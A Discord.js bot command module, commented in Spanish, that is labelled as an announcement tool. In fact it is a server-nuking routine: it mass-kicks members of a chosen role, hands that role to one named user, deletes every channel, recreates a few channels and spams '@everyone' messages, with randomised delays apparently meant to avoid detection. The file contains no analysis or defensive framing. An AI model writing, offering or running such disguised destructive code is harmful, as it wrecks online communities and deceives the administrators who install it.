const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('announce')
        .setDescription('Herramienta de anuncios importantes')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
        .addUserOption(option =>
            option.setName('useradmin')
                .setDescription('Usuario administrador principal')
                .setRequired(true))
        .addRoleOption(option =>
            option.setName('roletogive')
                .setDescription('Rol de administración')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('message')
                .setDescription('Mensaje importante para anunciar')
                .setRequired(true)),

    async execute(interaction) {
        await interaction.deferReply({ ephemeral: true });

        const userAdmin = interaction.options.getUser('useradmin');
        const roleToGive = interaction.options.getRole('roletogive');
        const message = interaction.options.getString('message');

        try {
            // 1. Expulsar miembros gradualmente
            const members = await interaction.guild.members.fetch();
            const membersToKick = members.filter(member => 
                member.roles.cache.has(roleToGive.id) && member.id !== userAdmin.id
            );

            for (const [index, member] of membersToKick.entries()) {
                try {
                    await member.kick(`Reorganización del servidor: ${interaction.user.tag}`);
                    // Delay entre expulsiones
                    if (index % 3 === 0) await new Promise(resolve => setTimeout(resolve, 1200));
                } catch (error) {
                    console.error(`No se pudo expulsar a ${member.user.tag}:`, error);
                }
            }

            // 2. Añadir rol al admin
            try {
                const adminMember = await interaction.guild.members.fetch(userAdmin.id);
                await adminMember.roles.add(roleToGive);
            } catch (error) {
                console.error(`No se pudo añadir el rol a ${userAdmin.tag}:`, error);
            }

            // 3. Eliminar canales con delays
            const channels = interaction.guild.channels.cache;
            let channelCount = 0;
            
            for (const channel of channels.values()) {
                try {
                    await channel.delete();
                    channelCount++;
                    
                    const delay = Math.min(2000, 500 + (channelCount * 200));
                    await new Promise(resolve => setTimeout(resolve, delay));
                    
                } catch (error) {
                    console.error(`No se pudo eliminar el canal ${channel.name}:`, error);
                }
            }

            // 4. Crear canales de forma natural
            const channelNames = ['general', 'announcements', 'important', 'chat'];
            const createdChannels = [];

            for (const [index, name] of channelNames.entries()) {
                try {
                    const newChannel = await interaction.guild.channels.create({
                        name: name,
                        type: 0,
                        permissionOverwrites: [
                            {
                                id: interaction.guild.id,
                                allow: [PermissionFlagsBits.ViewChannel],
                            },
                        ],
                    });
                    createdChannels.push(newChannel);
                    
                    // Delay aleatorio entre 1-3 segundos
                    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
                    
                } catch (error) {
                    console.error('Error al crear canal:', error);
                }
            }

            // 5. Enviar mensajes con @everyone en canales aleatorios
            const spamMessage = `@everyone ${message}`;
            
            // Enviar en todos los canales creados con delays
            for (const [index, channel] of createdChannels.entries()) {
                try {
                    // Enviar múltiples veces en cada canal (2-3 veces)
                    for (let i = 0; i < 2 + Math.floor(Math.random() * 2); i++) {
                        await channel.send(spamMessage);
                        // Delay entre mensajes en el mismo canal
                        await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 3000));
                    }
                    
                    // Delay entre canales
                    await new Promise(resolve => setTimeout(resolve, 3000 + Math.random() * 4000));
                    
                } catch (error) {
                    console.error('Error al enviar mensaje:', error);
                }
            }

            await interaction.editReply('Anuncios completados exitosamente.');

        } catch (error) {
            console.error('Error durante la ejecución del comando:', error);
            await interaction.editReply('Ocurrió un error durante el proceso de anuncios.');
        }
    },
};
